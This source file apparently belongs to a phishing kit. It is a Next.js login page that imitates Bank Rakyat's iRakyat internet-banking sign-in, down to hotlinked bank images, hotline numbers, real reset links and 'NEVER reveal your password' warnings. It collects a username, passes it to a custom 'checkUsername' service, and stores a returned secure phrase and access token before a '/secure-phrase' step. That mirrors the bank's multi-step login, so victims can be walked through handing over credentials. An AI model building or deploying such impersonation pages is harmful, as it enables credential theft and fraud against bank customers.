'use client';
import { accessTokenAtom, securePhraseAtom, usernameAtom } from '@/atoms';
import Steps from '@/components/Steps';
import { checkUsername } from '@/services/checkUsername';
import { useMutation } from '@tanstack/react-query';
import { useAtom } from 'jotai';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import React, { useState } from 'react';

export default function Login() {
  const router = useRouter();
  const [username, setUsername] = useAtom(usernameAtom);
  const [_, setSecurePhrase] = useAtom(securePhraseAtom);
  const [__, setAccessToken] = useAtom(accessTokenAtom);
  const [visible, setVisible] = useState<'hidden' | 'inline'>('hidden');

  const checkUsernameMut = useMutation({
    mutationFn: checkUsername,
    onSuccess: (data) => {
      setSecurePhrase(data.data.body.securePhrase);
      setAccessToken(data.data.header.accessToken);
      router.push('/secure-phrase');
    },
    onError: (error) => {
      console.log(error);
    },
  });

  const handleSumbit = () => {
    if (!username.trim()) {
      setVisible('inline');
      return;
    } else {
      setVisible('hidden');
      checkUsernameMut.mutate(username);
    }
  };

  return (
    <>
      <Steps title="" step={1} />
      <div className="flex flex-col max-w-[960px]  md:flex-row  items-stretch padx bg-slate-100 mx-auto">
        <div className="p-10 md:w-5/6  bg-white shadow-sm leading-[1.5] ">
          <h3 className="text-[#e9730d] mt-0 text-center text-[calc(1.2rem_+_0.6vw)]  mb-2 font-medium">
            Welcome to <b>iRakyat</b> Internet Banking
          </h3>
          <span className="text-center font-normal text-sm block">
            Manage your account online at <br /> your convenience
          </span>
          <div className="!mb-[15px]"></div>
          <div
            id="messages"
            className="mt-1.5 pl-[22px] bg-[url('https://payment.bankrakyat.com.my/fpxonline/fpxui/css/images/ib/error.png')] bg-no-repeat text-[#a70000] text-[.67em] text-left mb-1"
          >
            <ul className="list-none">
              <li>
                <label
                  className={`${visible}`}
                  htmlFor="chkusername"
                  id="chkusername"
                >
                  Please enter username.
                </label>
              </li>
            </ul>
            <ul>
              <li>
                <label className="hidden" htmlFor="chkinvalidLogin">
                  Username or password entered is invalid.
                </label>
              </li>
            </ul>
          </div>
          <div className="mb-[15px] font-normal text-sm ">
            <h3 className="mt-[50px] text-left text-[#dbdbdb] text-lg">
              <b className="font-extrabold">Username:</b>
            </h3>

            <input
              type="text"
              name="username"
              id="username"
              tabIndex={1}
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              size={30}
              className="bg-[#212529] text-white sborder-[#dbdbdb] outline-none border-solid border py-[5px] pr-[15px] pl-[35px] w-full bg-[url('https://payment.bankrakyat.com.my/fpxonline/fpxui/css/images/user-silhouette.svg')] bg-3.75 bg-no-repeat bg-[10px]"
              style={{ fontSize: 'inherit' }}
            />
          </div>
          <div className="mb-[15px] font-normal text-sm">
            <div className="mt-[25px] flex justify-between gap-5 ">
              <input
                type="button"
                className="bg-[#e9730d] text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
                data-toggle="modal"
                data-target="#myModal"
                value="Cancel"
                disabled={checkUsernameMut.isLoading}
              />
              <input
                type="submit"
                name="doSubmit"
                id="doSubmit"
                className="bg-[#e9730d] text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
                value={checkUsernameMut.isLoading ? 'Loading...' : 'Next'}
                onClick={handleSumbit}
                tabIndex={2}
                disabled={checkUsernameMut.isLoading}
              />
            </div>
          </div>
          <div className="problem-login-group">
            <p className="text-[#e9730d] text-sm">PROBLEM LOGIN</p>
            <a
              className="current forgotPassword text-[#337ab7] hover:text-[#1253b5] outline-0 no-underline text-sm"
              href="https://www2.irakyat.com.my/personal/reset/forgot_id_or_password.do"
              target="_top"
            >
              Forgot Username / Password
            </a>
            <br />
            <a
              className="current changeCard text-[#337ab7] hover:text-[#1253b5] outline-0 no-underline text-sm"
              href="https://www2.irakyat.com.my/personal/change_card/change_card.do"
              target="_top"
            >
              Change Card
            </a>
          </div>
          <div className="clear"></div>
        </div>
        <div className="mt-[15px] md:ml-[50px]">
          <div className="flex flex-col flex-column-reverse-1200">
            <div className="">
              <h4 className="text-[#0f55aa] mt-[25px] text-[calc(1.275rem_+_.3vw)] mb-2">
                iRakyat Internet banking
              </h4>
              <ul className="pl-[25px] list-none text-sm">
                <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                  24 hours
                </li>
              </ul>
              <h4 className="text-[#0f55aa] mt-[25px] text-[calc(1.275rem_+_.3vw)] mb-2">
                Call Centre Tele-Rakyat (24 Hours)
              </h4>
              <ul className="pl-[25px] list-none text-sm">
                <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                  Local 1-300-80-5454
                </li>
                <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                  International +603-5526-9000
                </li>
              </ul>
            </div>
          </div>
          <div className="bg-[#dbdbdb] h-[1px] w-full my-[35px]"></div>
          <div className="flex !flex-col">
            <div className="flex items-center mb-[25px]">
              <Image
                src="/images/PDRM Logo.png"
                className="!inline mr-[15px]"
                width={45}
                height={50}
                alt="PDRM logo"
              />
              <h4 className="text-[#0f55aa] text-[calc(1.275rem_++.3vw)]">
                iRakyat Internet banking
              </h4>
            </div>
            <ul className="pl-[25px] list-none text-sm">
              <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                <b className="text-[#ef5a01] font-extrabold">NEVER </b> respond
                to any phone call/ SMS/ e-mail requesting your bank account
                details.
              </li>
              <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                <b className="text-[#ef5a01] font-extrabold">NEVER </b> reveal
                your bank account details/ ATM PIN/ Internet banking password to
                anyone.
              </li>
              <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                <b className="text-[#ef5a01] font-extrabold">NEVER </b> follow
                instruction from unknown party to do banking transaction or make
                changes to your bank account details.
              </li>
              <li className="before:content-['.'] before:absolute before:text-[#e9730d] before:-left-[15px] before:-top-[12px] before:text-[35px] text-black relative mb-[5px]">
                <b className="text-[#ef5a01] font-extrabold">NEVER </b> be a
                victim of schemes that sound too good to be true.
              </li>
            </ul>
          </div>
        </div>
      </div>
    </>
  );
}
